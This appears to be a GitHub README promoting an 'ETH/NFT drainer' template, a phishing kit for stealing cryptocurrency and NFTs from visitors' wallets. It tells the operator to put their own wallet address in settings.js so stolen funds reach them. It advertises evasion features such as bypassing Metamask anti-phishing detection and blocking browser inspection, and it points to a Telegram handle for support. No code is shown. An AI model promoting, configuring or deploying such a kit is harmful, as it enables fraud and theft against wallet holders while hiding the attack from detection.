### If you have questions or need any help, Message me here: [@cybergeek](https://t.me/cybergeeky) 

## 🖼️ NFT Stealer / ETH Stealer / Drainer Template / ETH Drainer / NFT Drainer

![preview](https://github.com/cyberlawd/ETH-TOKEN-NFT-DRAINER/blob/main/NFT.png?raw=true)
[Drainer V2 BETA VERSION](https://t.me/cybergeeky)


## `✏️ Guidelines on Setting Up the Template:` 
you need to edit the **settings.js** file. 
- line 1: const adress = `"YOUR WALLET";` replace **YOUR WALLET with your ETH wallet address.**

To get instant support, contact me on [@cybergeek](https://t.me/cybergeeky)


## `💡 Features`

- [x] simple design 
- [x] Immediate transactions
- [x] Contract not required
- [x] Metamask Anti Phishing Detections
- [x] Anti F12 Inspect
- [x] Inspect Element Detection
- [x] Custom-made Design


##### Please ⭐ the repo to support my project
![star](https://cdn.discordapp.com/attachments/975036883958636557/975057102097743973/unknown.png)
